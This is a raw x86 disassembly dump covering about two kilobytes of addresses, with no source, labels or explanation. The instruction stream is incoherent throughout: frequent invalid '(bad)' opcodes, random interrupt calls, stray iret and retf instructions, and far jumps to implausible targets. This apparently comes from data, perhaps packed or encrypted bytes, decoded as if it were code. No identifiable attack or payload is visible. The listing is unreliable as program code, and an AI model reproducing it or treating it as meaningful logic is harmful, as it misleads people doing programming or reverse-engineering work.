  4269e2:	jo     0x4269b1
  4269e4:	jbe    0x4269fa
  4269e6:	rol    BYTE PTR [eax+0x76cdf100],0x4c
  4269ed:	int    0x8d
  4269ef:	dec    esp
  4269f0:	cmp    edi,DWORD PTR [ecx+0x3b]
  4269f3:	lock int 0xe6
  4269f6:	mov    bl,dl
  4269f8:	mov    ebp,0x28f2d392
  4269fd:	push   ebx
  4269fe:	ror    edi,cl
  426a00:	iret   
  426a01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a02:	inc    DWORD PTR [eax]
  426a04:	add    BYTE PTR [edx],cl
  426a06:	int3   
  426a07:	push   es
  426a08:	sbb    eax,0xcf0000ff
  426a0d:	jbe    0x426a34
  426a0f:	mov    ebp,0xeff5
  426a14:	int    0x8d
  426a16:	xor    ch,cl
  426a18:	xchg   esi,eax
  426a19:	xor    BYTE PTR [ebx],bh
  426a1b:	psrlq  mm5,mm3
  426a1e:	xchg   edx,eax
  426a1f:	add    al,0xfb
  426a21:	call   ebx
  426a23:	jmp    0xcf05:0xa135328
  426a2a:	sbb    eax,0x610000ff
  426a2f:	sub    esi,DWORD PTR ds:0x6a5d8080
  426a35:	xor    eax,0xab88080
  426a3a:	push   es
  426a3b:	jo     0x426a3d
  426a3d:	add    BYTE PTR [eax],al
  426a3f:	iret   
  426a40:	mov    dh,BYTE PTR [eax]
  426a42:	mov    eax,0xb4cf0a
  426a47:	add    BYTE PTR [eax],al
  426a49:	pop    ebp
  426a4a:	adc    BYTE PTR ds:0xab88080,dh
  426a50:	push   es
  426a51:	bound  eax,QWORD PTR [eax]
  426a53:	add    BYTE PTR [eax],al
  426a55:	int    0xd2
  426a57:	mov    eax,0x94060a
  426a5c:	add    BYTE PTR [eax],al
  426a5e:	int    0xd3
  426a60:	mov    eax,0x98060a
  426a65:	add    BYTE PTR [eax],al
  426a67:	add    al,0x6d
  426a69:	sub    ch,cl
  426a6b:	jge    0x426a25
  426a6d:	or     cl,bh
  426a6f:	mov    eax,0xcf000000
  426a74:	mov    ch,BYTE PTR [eax]
  426a76:	mov    eax,0xbccf0a
  426a7b:	add    BYTE PTR [eax],al
  426a7d:	add    al,0xd3
  426a7f:	pusha  
  426a80:	mov    eax,0xc0cf0a
  426a85:	add    BYTE PTR [eax],al
  426a87:	iret   
  426a88:	mov    cl,BYTE PTR [edx-0x48]
  426a8b:	or     cl,bh
  426a8d:	les    eax,FWORD PTR [eax]
  426a8f:	add    BYTE PTR [eax],al
  426a91:	int    0xf9
  426a93:	mov    eax,0x9c670a
  426a98:	add    BYTE PTR [eax],al
  426a9a:	iret   
  426a9b:	loopne 0x426a3d
  426a9d:	pop    edi
  426a9e:	add    BYTE PTR ds:0xab88080,dh
  426aa4:	iret   
  426aa5:	enter  0x0,0x0
  426aa9:	iret   
  426aaa:	mov    bh,bh
  426aac:	mov    eax,0x90cf0a
  426ab1:	add    BYTE PTR [eax],al
  426ab3:	mov    eax,0xa0670a
  426ab8:	add    BYTE PTR [eax],al
  426aba:	add    al,0xc9
  426abc:	stc    
  426abd:	mov    eax,0xa4670a
  426ac2:	add    BYTE PTR [eax],al
  426ac4:	int    0xf9
  426ac6:	pop    edi
  426ac7:	leave  
  426ac8:	xor    eax,0xab88080
  426acd:	iret   
  426ace:	add    BYTE PTR [eax],0x0
  426ad1:	add    ch,cl
  426ad3:	jge    0x426a8d
  426ad5:	or     cl,bh
  426ad7:	aam    0x0
  426ad9:	add    BYTE PTR [eax],al
  426adb:	int    0xc5
  426add:	mov    eax,0xe0060a
  426ae2:	add    BYTE PTR [eax],al
  426ae4:	cmp    ebp,DWORD PTR [ebp-0x48]
  426ae7:	or     ah,BYTE PTR [edi-0x58]
  426aea:	add    BYTE PTR [eax],al
  426aec:	add    bh,cl
  426aee:	addr16 in al,0x0
  426af1:	add    BYTE PTR [eax],al
  426af3:	leave  
  426af4:	push   es
  426af5:	lods   al,BYTE PTR ds:[esi]
  426af6:	add    BYTE PTR [eax],al
  426af8:	add    dh,ah
  426afa:	xor    eax,0x6c9352b
  426aff:	fadd   DWORD PTR [eax]
  426b01:	add    BYTE PTR [eax],al
  426b03:	jae    0x426b3a
  426b05:	jno    0x426b3c
  426b07:	mov    eax,0x3076cdaf
  426b0c:	int    0x8d
  426b0e:	xor    ch,cl
  426b10:	xchg   esi,eax
  426b11:	xor    BYTE PTR [edx+eax*1],al
  426b14:	call   ebx
  426b16:	repnz sub BYTE PTR [ebx],bh
  426b19:	jns    0x426aee
  426b1b:	mov    ebp,0xcdd35392
  426b20:	lea    esi,[eax]
  426b22:	add    al,0x2
  426b24:	(bad)  
  426b25:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426b2b:	repz xchg edx,eax
  426b2d:	push   ebx
  426b2e:	jecxz  0x426b6b
  426b30:	retf   
  426b31:	add    al,0xd2
  426b33:	sbb    bl,BYTE PTR [ebx]
  426b35:	retf   
  426b36:	cmp    eax,DWORD PTR [eax]
  426b38:	inc    ebx
  426b39:	cli    
  426b3a:	das    
  426b3b:	or     cl,dl
  426b3d:	add    BYTE PTR [eax+0x43888280],0xd2
  426b44:	das    
  426b45:	add    al,0x37
  426b47:	add    BYTE PTR [eax+0x308dcd80],0xcd
  426b4e:	xchg   esi,eax
  426b4f:	xor    BYTE PTR [ebx],bh
  426b51:	psrlq  mm5,mm3
  426b54:	xchg   edx,eax
  426b55:	add    al,0xfb
  426b57:	call   ebx
  426b59:	jmp    0xcd7d:0x87135328
  426b60:	aad    0xb8
  426b62:	cmp    edx,DWORD PTR ds:0x708d
  426b68:	add    ch,cl
  426b6a:	lea    esi,[eax]
  426b6c:	int    0xe6
  426b6e:	xor    BYTE PTR [ebx],bh
  426b70:	psrlq  mm5,mm3
  426b73:	xchg   edx,eax
  426b74:	add    al,0xf8
  426b76:	call   ebx
  426b78:	jmp    0x8832bea5
  426b7d:	jge    0x426b37
  426b7f:	int    0xcc
  426b81:	lea    esi,[eax+0x0]
  426b84:	add    BYTE PTR [eax],al
  426b86:	mov    eax,0xd3b8e3f8
  426b8b:	repnz das 
  426b8d:	mov    eax,0x53b8f3e3
  426b92:	jecxz  0x426b61
  426b94:	lea    esi,[eax]
  426b96:	int    0xe6
  426b98:	xor    BYTE PTR [ebx],bh
  426b9a:	psrlq  mm5,mm3
  426b9d:	xchg   edx,eax
  426b9e:	add    al,0xf8
  426ba0:	call   ebx
  426ba2:	jmp    0x8832becf
  426ba7:	jge    0x426b61
  426ba9:	or     dl,BYTE PTR ds:0x708d
  426baf:	add    ch,cl
  426bb1:	lea    esi,[eax]
  426bb3:	int    0x96
  426bb5:	xor    BYTE PTR [ebx],bh
  426bb7:	(bad)  
  426bb9:	sti    
  426bba:	call   ebx
  426bbc:	jmp    0x426b50
  426bbe:	shr    edx,cl
  426bc0:	sub    BYTE PTR [ebx+0x13],dl
  426bc3:	int    0x96
  426bc5:	xor    BYTE PTR [edi+0x308dcdd3],al
  426bcb:	add    al,0x2
  426bcd:	(bad)  
  426bce:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426bd4:	repz xchg edx,eax
  426bd6:	push   ebx
  426bd7:	jecxz  0x426c14
  426bd9:	retf   
  426bda:	add    al,0xd2
  426bdc:	sbb    bl,BYTE PTR [ebx]
  426bde:	retf   
  426bdf:	cmp    eax,DWORD PTR [eax]
  426be1:	inc    ebx
  426be2:	cli    
  426be3:	das    
  426be4:	or     ebp,DWORD PTR [esi+0x2f000000]
  426bea:	pop    es
  426beb:	pop    ebx
  426bec:	add    BYTE PTR [eax],al
  426bee:	add    bl,al
  426bf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426bf1:	mov    esi,0x76cf4229
  426bf6:	jne    0x426c02
  426bf8:	jbe    0x426b82
  426bfa:	int    0x76
  426bfc:	mov    BYTE PTR [edi+0x13de37b6],bh
  426c02:	or     bl,BYTE PTR [ecx+ecx*8]
  426c05:	ins    BYTE PTR es:[edi],dx
  426c06:	test   BYTE PTR [ebp-0x32dadcf6],bh
  426c0c:	jbe    0x426c83
  426c0e:	int    0x8d
  426c10:	jge    0x426c41
  426c12:	inc    ebp
  426c13:	jge    0x426ba7
  426c15:	shr    ebx,cl
  426c17:	xchg   edx,eax
  426c18:	int    0x8d
  426c1a:	jne    0x426be9
  426c1c:	xchg   esi,eax
  426c1d:	jge    0x426c5a
  426c1f:	leave  
  426c20:	cmp    ebx,edx
  426c22:	push   ebx
  426c23:	icebp  
  426c24:	int    0x76
  426c26:	cmc    
  426c27:	bound  eax,QWORD PTR [ebp-0x7f7f7edb]
  426c2d:	jo     0x426bfe
  426c2f:	push   es
  426c30:	cmc    
  426c31:	inc    DWORD PTR [eax]
  426c33:	add    BYTE PTR [eax-0x2d],dh
  426c36:	repnz sub BYTE PTR [ebp+0xf2a3],bh
  426c3d:	int    0x76
  426c3f:	in     eax,dx
  426c40:	int    0x8d
  426c42:	adc    DWORD PTR [edi],ebp
  426c44:	inc    ebp
  426c45:	jge    0x426bd9
  426c47:	shr    ebx,cl
  426c49:	xchg   edx,eax
  426c4a:	int    0x8d
  426c4c:	in     eax,dx
  426c4d:	int    0x96
  426c4f:	adc    ebx,edx
  426c51:	repnz sub ch,cl
  426c54:	iret   
  426c55:	cmc    
  426c56:	inc    DWORD PTR [eax]
  426c58:	add    ch,cl
  426c5a:	mov    DWORD PTR [ebx],edi
  426c5c:	leave  
  426c5d:	cmp    ebx,edx
  426c5f:	push   ebx
  426c60:	rol    BYTE PTR [ebx+0x7d],cl
  426c63:	das    
  426c64:	push   es
  426c65:	push   ebp
  426c66:	add    BYTE PTR [eax-0xa293280],0xc9
  426c6d:	jbe    0x426c7c
  426c6f:	(bad)  
  426c70:	ficom  WORD PTR ss:[ebx]
  426c73:	pop    ebp
  426c74:	mov    ebp,0xa25230a
  426c79:	jbe    0x426c6c
  426c7b:	or     ah,BYTE PTR [esi-0x6289f56b]
  426c81:	int    0x76
  426c83:	xchg   ebp,eax
  426c84:	int    0x8d
  426c86:	popf   
  426c87:	das    
  426c88:	inc    ebp
  426c89:	jge    0x426c1d
  426c8b:	shr    ebx,cl
  426c8d:	xchg   edx,eax
  426c8e:	int    0x8d
  426c90:	xchg   ebp,eax
  426c91:	int    0x96
  426c93:	popf   
  426c94:	cmp    ecx,ecx
  426c96:	cmp    ebx,edx
  426c98:	push   ebx
  426c99:	icebp  
  426c9a:	bound  eax,QWORD PTR [eax]
  426c9c:	(bad)  
  426c9d:	xor    al,0xd3
  426c9f:	repnz sub BYTE PTR [eax],al
  426ca2:	pop    ecx
  426ca3:	xor    eax,0xbd808081
  426ca8:	push   eax
  426ca9:	repnz add BYTE PTR [eax],al
  426cac:	int    0x76
  426cae:	xchg   ebp,eax
  426caf:	int    0x8d
  426cb1:	popf   
  426cb2:	das    
  426cb3:	inc    ebp
  426cb4:	jge    0x426c48
  426cb6:	shr    ebx,cl
  426cb8:	xchg   edx,eax
  426cb9:	int    0x8d
  426cbb:	xchg   ebp,eax
  426cbc:	int    0x96
  426cbe:	popf   
  426cbf:	cmp    ecx,ecx
  426cc1:	cmp    ebx,edx
  426cc3:	push   ebx
  426cc4:	icebp  
  426cc5:	bound  eax,QWORD PTR [eax]
  426cc7:	pop    ecx
  426cc8:	xor    eax,0xd3808081
  426ccd:	repnz sub BYTE PTR [eax],al
  426cd0:	pop    ecx
  426cd1:	sub    eax,0xbd808081
  426cd6:	xchg   edx,eax
  426cd7:	repnz add BYTE PTR [eax],al
  426cda:	int    0x7
  426cdc:	xor    eax,0xcd808081
  426ce1:	mov    ch,cl
  426ce3:	jle    0x426d49
  426ce5:	xchg   DWORD PTR [eax-0x327772f6],ecx
  426ceb:	lea    ecx,ds:0x2ff176cd
  426cf1:	inc    ebp
  426cf2:	rcl    DWORD PTR [edx-0x326d422d],cl
  426cf8:	jbe    0x426d07
  426cfa:	int    0x96
  426cfc:	icebp  
  426cfd:	cmp    esi,eax
  426cff:	shr    DWORD PTR [ebp+0x536d3b28],cl
  426d05:	ror    ebp,cl
  426d07:	lea    ecx,[eax+0x187ebb2f]
  426d0d:	push   es
  426d0e:	jge    0x426ce4
  426d10:	dec    esp
  426d11:	int    0x7
  426d13:	popf   
  426d14:	add    DWORD PTR [eax+0x4180c980],0xcd358621
  426d1e:	jbe    0x426d6c
  426d20:	int    0x76
  426d22:	xor    BYTE PTR [eax],al
  426d24:	(bad)  
  426d25:	cmp    al,0x0
  426d27:	(bad)  
  426d28:	cmc    
  426d29:	add    dh,dl
  426d2b:	sub    al,0x0
  426d2d:	(bad)  
  426d2e:	and    al,0x0
  426d30:	(bad)  
  426d31:	sbb    al,0x0
  426d33:	(bad)  
  426d34:	adc    al,0xbd
  426d36:	test   ch,dh
  426d38:	add    BYTE PTR [eax],al
  426d3a:	or     al,BYTE PTR [esi]
  426d3c:	adc    edi,edi
  426d3e:	add    BYTE PTR [eax],al
  426d40:	int    0x76
  426d42:	cmp    al,0x4
  426d44:	fcom   QWORD PTR [eax+eax*4]
  426d47:	aam    0x1a
  426d49:	int    0x76
  426d4b:	cmp    al,0x4
  426d4d:	fsub   QWORD PTR [eax+eax*4]
  426d50:	aam    0x4e
  426d52:	int    0x6
  426d54:	adc    edi,edi
  426d56:	add    BYTE PTR [eax],al
  426d58:	int    0x8d
  426d5a:	cmp    al,0xa
  426d5c:	outs   dx,BYTE PTR ds:[esi]
  426d5d:	sbb    al,0xec
  426d5f:	push   ebx
  426d60:	add    dh,dl
  426d62:	cmp    al,0x0
  426d64:	(bad)  
  426d65:	cmc    
  426d66:	mov    ebp,0x6daa
  426d6b:	stos   BYTE PTR es:[edi],al
  426d6c:	test   al,0x63
  426d6e:	retf   
  426d6f:	shl    BYTE PTR [eax+eax*4],cl
  426d72:	xchg   esi,eax
  426d73:	int    0xed
  426d75:	jno    0x426de8
  426d77:	cwde   
  426d78:	leave  
  426d79:	jbe    0x426d78
  426d7b:	dec    ecx
  426d7c:	and    DWORD PTR [esi-0x68936cb],eax
  426d82:	inc    ecx
  426d83:	and    DWORD PTR [esi-0x28932cb],eax
  426d89:	int    0xd6
  426d8b:	std    
  426d8c:	sar    bh,0x5f
  426d8f:	shl    DWORD PTR [ecx],1
  426d91:	xchg   BYTE PTR ds:0x3ba0d33b,dh
  426d97:	sti    
  426d98:	sar    DWORD PTR [ebp+0x28b9d392],cl
  426d9e:	push   ebx
  426d9f:	jns    0x426d6e
  426da1:	(bad)  
  426da2:	mov    BYTE PTR [ebx+0x11],al
  426da5:	int    0x76
  426da7:	std    
  426da8:	aam    0xc4
  426daa:	int    0xd6
  426dac:	std    
  426dad:	cmp    edx,ebx
  426daf:	cmp    edi,ebx
  426db1:	sar    DWORD PTR [ecx-0x6d422cd8],cl
  426db7:	push   ebx
  426db8:	jns    0x426d87
  426dba:	(bad)  
  426dbb:	dec    esp
  426dbc:	inc    ebx
  426dbd:	adc    esp,edx
  426dbf:	pop    ebx
  426dc0:	int    0x96
  426dc2:	xor    BYTE PTR [edx-0x32b31933],bl
  426dc8:	jbe    0x426d52
  426dca:	cmp    esi,edi
  426dcc:	push   es
  426dcd:	add    ah,dl
  426dcf:	push   esi
  426dd0:	pop    ebx
  426dd1:	retf   0x8624
  426dd4:	or     DWORD PTR [esi-0x59a6d0d1],esp
  426dda:	das    
  426ddb:	push   es
  426ddc:	fcmovbe st,st(6)
  426dde:	dec    esi
  426ddf:	add    al,0xf4
  426de1:	adc    DWORD PTR [edx],0xffffffc5
  426de4:	fwait
  426de5:	add    BYTE PTR [eax+0x2fa60980],0xec
  426dec:	dec    esp
  426ded:	adc    ch,ah
  426def:	in     eax,dx
  426df0:	add    BYTE PTR [eax+0x2fa60980],0xf1
  426df7:	lea    ebp,[edi]
  426df9:	retf   0x2fa6
  426dfc:	or     DWORD PTR [esi+eax*4],esp
  426dff:	js     0x426e44
  426e01:	clc    
  426e02:	or     BYTE PTR [esi],0x63
  426e05:	int    0x76
  426e07:	stc    
  426e08:	cmp    edx,ebx
  426e0a:	int    0x8d
  426e0c:	stc    
  426e0d:	add    al,0x2
  426e0f:	jmp    FWORD PTR [edx+0x76cd4aec]
  426e15:	std    
  426e16:	cmp    edx,ebx
  426e18:	int    0x8d
  426e1a:	std    
  426e1b:	cmp    edx,DWORD PTR [ebx]
  426e1d:	shl    edx,cl
  426e1f:	sub    bl,dl
  426e21:	mov    ebp,0xa8d35392
  426e26:	retf   
  426e27:	ror    BYTE PTR [eax+eax*4-0x6a],cl
  426e2b:	int    0xed
  426e2d:	add    al,0xed
  426e2f:	(bad)  
  426e30:	leave  
  426e31:	jbe    0x426e30
  426e33:	dec    ecx
  426e34:	and    DWORD PTR [esi+0x21416135],eax
  426e3a:	xchg   BYTE PTR ds:0xcdf9960a,dh
  426e40:	jbe    0x426e56
  426e42:	or     dh,BYTE PTR [esi+0x14]
  426e45:	int    0x76
  426e47:	adc    al,0xcd
  426e49:	add    DWORD PTR ds:0xcd808081,ebp
  426e4f:	lea    edx,[ecx*8+0x2d0acd80]
  426e56:	add    DWORD PTR [eax-0x78763280],0xa5b647c
  426e60:	lea    esi,[ebp-0x32028933]
  426e66:	(bad)  
  426e67:	std    
  426e68:	cwde   
  426e69:	call   0x3b85:0x82cfffc0
  426e70:	jns    0x426e45
  426e72:	mov    ebp,0xf03baa92
  426e77:	shl    edx,cl
  426e79:	sub    BYTE PTR [ebx-0x2d],dl
  426e7c:	or     dh,BYTE PTR [esi-0x63]
  426e7f:	int    0x76
  426e81:	std    
  426e82:	int    0x8d
  426e84:	std    
  426e85:	cmp    edi,DWORD PTR [ecx-0x2d]
  426e88:	mov    ebp,0xd3f03b92
  426e8d:	repnz sub BYTE PTR [ebx-0x2d],dl
  426e91:	or     dh,BYTE PTR [esi-0x53]
  426e94:	int    0x76
  426e96:	mov    ch,0xcd
  426e98:	ins    BYTE PTR es:[edi],dx
  426e99:	jo     0x426e9f
  426e9b:	mov    ebp,0xf1760a4c
  426ea0:	int    0x76
  426ea2:	mov    ch,0xcd
  426ea4:	ins    BYTE PTR es:[edi],dx
  426ea5:	pop    esp
  426ea6:	int    0x8d
  426ea8:	mov    ch,0x7c
  426eaa:	push   es
  426eab:	outs   dx,BYTE PTR ds:[esi]
  426eac:	xchg   esp,eax
  426ead:	int    0x76
  426eaf:	mov    ch,0xd4
  426eb1:	sbb    al,0xcd
  426eb3:	ins    BYTE PTR es:[edi],dx
  426eb4:	pop    esp
  426eb5:	int    0x8d
  426eb7:	mov    ch,0xcd
  426eb9:	jle    0x426e4f
  426ebb:	jl     0x426eb5
  426ebd:	icebp  
  426ebe:	sub    edi,DWORD PTR [ebp-0x33]
  426ec1:	jbe    0x426e78
  426ec3:	int    0x6c
  426ec5:	pop    esp
  426ec6:	xchg   ebx,edx
  426ec8:	in     al,dx
  426ec9:	xchg   ebp,ecx
  426ecb:	ins    BYTE PTR es:[edi],dx
  426ecc:	xchg   esp,eax
  426ecd:	or     dh,BYTE PTR [esi-0x43]
  426ed0:	int    0x76
  426ed2:	std    
  426ed3:	int    0x8d
  426ed5:	std    
  426ed6:	cmp    edi,DWORD PTR [ecx+0x3b]
  426ed9:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426ee0:	push   ebx
  426ee1:	ror    DWORD PTR [edx],cl
  426ee3:	jbe    0x426ef9
  426ee5:	int    0x76
  426ee7:	std    
  426ee8:	int    0x8d
  426eea:	std    
  426eeb:	cmp    edi,DWORD PTR [ecx+0x3b]
  426eee:	lock shl edx,cl
  426ef1:	sub    bl,dl
  426ef3:	mov    ebp,0xad35392
  426ef8:	jbe    0x426f0e
  426efa:	int    0x76
  426efc:	std    
  426efd:	int    0x8d
  426eff:	std    
  426f00:	cmp    esi,eax
  426f02:	cmp    edi,DWORD PTR [ecx-0x2d]
  426f05:	repnz sub bl,dl
  426f08:	mov    ebp,0xcdd35392
  426f0d:	lea    esi,[eax]
  426f0f:	or     al,BYTE PTR [ecx-0x36eb69f6]
  426f15:	jbe    0x426f2b
  426f17:	cmp    DWORD PTR [ecx],esp
  426f19:	xchg   BYTE PTR ds:0xb21476c9,dh
  426f1f:	and    DWORD PTR [esi+0x1476c935],eax
  426f25:	imul   esp,DWORD PTR [ecx],0x36eb3586
  426f2b:	xchg   BYTE PTR [eax-0x2893280],al
  426f31:	int    0x8d
  426f33:	std    
  426f34:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f37:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426f3e:	push   ebx
  426f3f:	ror    DWORD PTR [edx],cl
  426f41:	jbe    0x426ef0
  426f43:	int    0x76
  426f45:	mov    ebp,0xa4c7687
  426f4a:	jbe    0x426ee9
  426f4c:	add    dh,dl
  426f4e:	popf   
  426f4f:	add    dh,dl
  426f51:	dec    esp
  426f52:	int    0x8d
  426f54:	mov    ch,0xbd
  426f56:	neg    bh
  426f58:	add    BYTE PTR [eax],al
  426f5a:	or     dh,BYTE PTR [esi+0x14]
  426f5d:	int    0x76
  426f5f:	adc    al,0x6
  426f61:	ins    DWORD PTR es:[edi],dx
  426f62:	aam    0x60
  426f64:	int    0x76
  426f66:	popf   
  426f67:	or     dh,BYTE PTR [esi-0x5b]
  426f6a:	int    0x76
  426f6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f6d:	int    0x8d
  426f6f:	dec    esp
  426f70:	xor    edx,ebx
  426f72:	or     dh,BYTE PTR [esi-0x5b]
  426f75:	int    0x76
  426f77:	adc    al,0xcd
  426f79:	lea    edx,[ecx*8+0x6e87306c]
  426f80:	dec    esp
  426f81:	int    0x8d
  426f83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f84:	inc    ebx
  426f85:	jge    0x426f09
  426f87:	sbb    ch,cl
  426f89:	jbe    0x426f9f
  426f8b:	int    0x6c
  426f8d:	dec    esp
  426f8e:	int    0x8d
  426f90:	adc    al,0x87
  426f92:	outs   dx,BYTE PTR ds:[esi]
  426f93:	mov    ch,cl
  426f95:	lea    esp,[ebp-0x2e142ccd]
  426f9b:	test   DWORD PTR [eax+0x2149bf80],eax
  426fa1:	xchg   BYTE PTR ds:0xc90da60a,dh
  426fa7:	jbe    0x427026
  426fa9:	inc    ecx
  426faa:	and    DWORD PTR [esi+0x7576c935],eax
  426fb0:	cmp    DWORD PTR [ecx],esp
  426fb2:	xchg   BYTE PTR ds:0xb26d76c9,dh
  426fb8:	and    DWORD PTR [esi+0xd76cf35],eax
  426fbe:	or     dh,BYTE PTR [esi-0xb]
  426fc1:	iret   
  426fc2:	jbe    0x427041
  426fc4:	or     dh,BYTE PTR [esi+0x11]
  426fc7:	iret   
  426fc8:	jbe    0x42703f
  426fca:	or     dh,BYTE PTR [esi+0x14]
  426fcd:	iret   
  426fce:	jbe    0x42703d
  426fd0:	or     dh,BYTE PTR [esi-0x13]
  426fd3:	int    0x76
  426fd5:	std    
  426fd6:	int    0x8d
  426fd8:	std    
  426fd9:	cmp    edi,DWORD PTR [ecx+0x3b]
  426fdc:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426fe3:	push   ebx
  426fe4:	ror    DWORD PTR [edx],cl
  426fe6:	jbe    0x426f8d
  426fe8:	jmp    0x426ffd
  426fea:	xchg   DWORD PTR [eax-0x4d03ed80],eax
  426ff0:	and    DWORD PTR [esi-0x22fad0cb],eax
  426ff6:	xchg   DWORD PTR [eax+0x4cc080],eax
  426ffc:	(bad)  
  426ffd:	popf   
  426ffe:	iret   
  426fff:	jbe    0x426fd1
  427001:	jo     0x426fc0
  427003:	xlat   BYTE PTR ds:[ebx]
  427004:	fild   WORD PTR [eax]
  427006:	add    ch,cl
  427008:	jbe    0x427003
  42700a:	int    0x8d
  42700c:	stc    
  42700d:	cmp    edi,DWORD PTR [ecx+0x3b]
  427010:	lock shl edx,cl
  427013:	sub    bl,dl
  427015:	mov    ebp,0xad35392
  42701a:	jbe    0x426fc9
  42701c:	or     ah,BYTE PTR [esi-0x6a29ae6b]
  427022:	int    0x76
  427024:	xchg   ebp,eax
  427025:	sar    DWORD PTR [ebp-0x2c1ec46e],cl
  42702b:	in     eax,0x28
  42702d:	push   ebx
  42702e:	popf   
  42702f:	or     ah,BYTE PTR [esi-0x689325b]
  427035:	int    0x8d
  427037:	stc    
  427038:	cmp    esi,eax
  42703a:	shl    edx,cl
  42703c:	sub    BYTE PTR [ebx],bh
  42703e:	jns    0x427013
  427040:	mov    ebp,0xcdd35392
  427045:	(bad)  
  427046:	stc    
  427047:	int    0x96
  427049:	stc    
  42704a:	cmp    ecx,DWORD PTR [edi]
  42704c:	cmp    ebx,ecx
  42704e:	shr    ebx,cl
  427050:	xchg   edx,eax
  427051:	shr    edx,cl
  427053:	sub    BYTE PTR [ebx+0x13],dl
  427056:	xchg   ebx,edx
  427058:	int    0x8d
  42705a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42705b:	or     ah,BYTE PTR [esi-0x2982bc9b]
  427061:	sub    ch,cl
  427063:	jbe    0x42705e
  427065:	int    0x8d
  427067:	stc    
  427068:	cmp    edi,DWORD PTR [ecx+0x3b]
  42706b:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427072:	push   ebx
  427073:	shl    DWORD PTR [eax-0x40],cl
  427076:	dec    esp
  427077:	iret   
  427078:	jbe    0x42704a
  42707a:	jo     0x427039
  42707c:	sti    
  42707d:	std    
  42707e:	add    BYTE PTR [eax],al
  427080:	int    0x76
  427082:	std    
  427083:	int    0x8d
  427085:	std    
  427086:	cmp    edi,DWORD PTR [ecx+0x3b]
  427089:	lock shl edx,cl
  42708c:	sub    bl,dl
  42708e:	mov    ebp,0xcdd35392
  427093:	lea    esp,[ebp+0x28d47d43]
  427099:	int    0x76
  42709b:	std    
  42709c:	int    0x8d
  42709e:	std    
  42709f:	cmp    edi,DWORD PTR [ecx+0x3b]
  4270a2:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4270a9:	push   ebx
  4270aa:	shl    DWORD PTR [eax-0x40],cl
  4270ad:	dec    esp
  4270ae:	iret   
  4270af:	jbe    0x427081
  4270b1:	jo     0x427070
  4270b3:	mov    edi,0xcd0000fd
  4270b8:	jbe    0x4270af
  4270ba:	int    0x8d
  4270bc:	cmc    
  4270bd:	int    0x89
  4270bf:	int    0x80
  4270c1:	cmp    esi,eax
  4270c3:	cmp    edi,DWORD PTR [ecx-0x2d]
  4270c6:	repnz sub bl,dl
  4270c9:	mov    ebp,0xcad35392
  4270ce:	je     0x427055
  4270d0:	ror    ch,1
  4270d2:	(bad)  
  4270d3:	std    
  4270d4:	int    0x96
  4270d6:	std    
  4270d7:	cmp    ecx,DWORD PTR [edi]
  4270d9:	cmp    ebx,ecx
  4270db:	shr    ebx,cl
  4270dd:	xchg   edx,eax
  4270de:	shr    edx,cl
  4270e0:	sub    BYTE PTR [edi],ch
  4270e2:	pop    ecx
  4270e3:	ins    DWORD PTR es:[edi],dx
  4270e4:	push   ebx
  4270e5:	adc    eax,DWORD PTR [ebx-0x2d]
  4270e8:	das    
  4270e9:	add    eax,0x80809212
  4270ee:	int    0x76
  4270f0:	adc    ebp,ecx
  4270f2:	lea    edx,[ecx]
  4270f4:	int    0x89
  4270f6:	int    0x80
  4270f8:	cmp    esi,eax
  4270fa:	cmp    edi,DWORD PTR [ecx-0x2d]
  4270fd:	repnz sub bl,dl
  427100:	mov    ebp,0xcad35392
  427105:	je     0x42708c
  427107:	ror    ch,1
  427109:	(bad)  
  42710a:	std    
  42710b:	int    0x96
  42710d:	std    
  42710e:	cmp    ecx,DWORD PTR [edi]
  427110:	cmp    ebx,ecx
  427112:	shr    ebx,cl
  427114:	xchg   edx,eax
  427115:	shr    edx,cl
  427117:	sub    BYTE PTR [edi],ch
  427119:	pop    ecx
  42711a:	ins    DWORD PTR es:[edi],dx
  42711b:	push   ebx
  42711c:	adc    eax,DWORD PTR [ebx-0x2d]
  42711f:	das    
  427120:	add    eax,0x8080928a
  427125:	int    0x76
  427127:	adc    al,0xcd
  427129:	lea    edx,[ecx*8+0x3b80cd89]
  427130:	lock cmp edi,DWORD PTR [ecx-0x2d]
  427134:	repnz sub bl,dl
  427137:	mov    ebp,0xcad35392
  42713c:	je     0x4270c3
  42713e:	ror    ch,1
  427140:	(bad)  
  427141:	std    
  427142:	int    0x96
  427144:	std    
  427145:	cmp    ecx,DWORD PTR [edi]
  427147:	cmp    ebx,ecx
  427149:	shr    ebx,cl
  42714b:	xchg   edx,eax
  42714c:	shr    edx,cl
  42714e:	sub    BYTE PTR [edi],ch
  427150:	pop    ecx
  427151:	ins    DWORD PTR es:[edi],dx
  427152:	push   ebx
  427153:	adc    eax,DWORD PTR [ebx-0x2d]
  427156:	das    
  427157:	add    eax,0x8080921b
  42715c:	int    0x76
  42715e:	in     eax,dx
  42715f:	int    0x8d
  427161:	in     eax,dx
  427162:	int    0x89
  427164:	int    0x80
  427166:	cmp    esi,eax
  427168:	cmp    edi,DWORD PTR [ecx-0x2d]
  42716b:	repnz sub bl,dl
  42716e:	mov    ebp,0xcad35392
  427173:	je     0x4270fa
  427175:	ror    ch,1
  427177:	(bad)  
  427178:	std    
  427179:	int    0x96
  42717b:	std    
  42717c:	cmp    ecx,DWORD PTR [edi]
  42717e:	cmp    ebx,ecx
  427180:	shr    ebx,cl
  427182:	xchg   edx,eax
  427183:	shr    edx,cl
  427185:	sub    BYTE PTR [edi],ch
  427187:	pop    ecx
  427188:	ins    DWORD PTR es:[edi],dx
  427189:	push   ebx
  42718a:	adc    eax,DWORD PTR [ebx-0x2d]
  42718d:	das    
  42718e:	add    eax,0x808081a5
  427193:	int    0x76
  427195:	adc    ebp,ecx
  427197:	lea    edx,[ecx]
  427199:	int    0x89
  42719b:	int    0x80
  42719d:	cmp    esi,eax
